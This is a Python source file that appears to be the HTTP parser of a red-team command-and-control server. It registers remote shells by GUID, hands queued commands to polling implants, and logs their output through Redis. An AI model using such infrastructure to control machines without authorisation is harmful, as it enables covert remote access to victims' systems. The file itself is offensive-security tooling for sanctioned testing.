"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/parser.py
"""
from core.log import Log
from core.ui import UI

class HTTPDParser:
    
    def __init__(self, config):
        self.cmds = {}
        self.cmds["register"] = self.register
        self.cmds["hello"] = self.hello
        self.config = config
        self.output = ";"
        self.db = self.config.get("redis")
        
    def parse_cmd(self, guid, data):
        cmd = data.split(" ", 1)[0].lower()
        if self.cmds.has_key(cmd):
            callback = self.cmds[cmd]
            callback(guid, data)
        else:
            # I assume we got command output here and save it
            if not data.strip() == "":
                self.db.push_output(guid, data)
                Log.log_shell(guid, "Received", data)
            
        return self.output
            
    def register(self, guid, data):
        cmd, guid, prompt = data.split(" ", 2)
        self.db.set_prompt(guid, prompt)
        index = self.db.get_id(guid)
        print ""
        UI.success("Registering new shell %s" % prompt)
        UI.success("New shell ID %s GUID is %s" % (index, guid))
        Log.log_event("New Shell", data)
        
    def hello(self, guid, data):
        self.output = self.db.get_cmd(guid)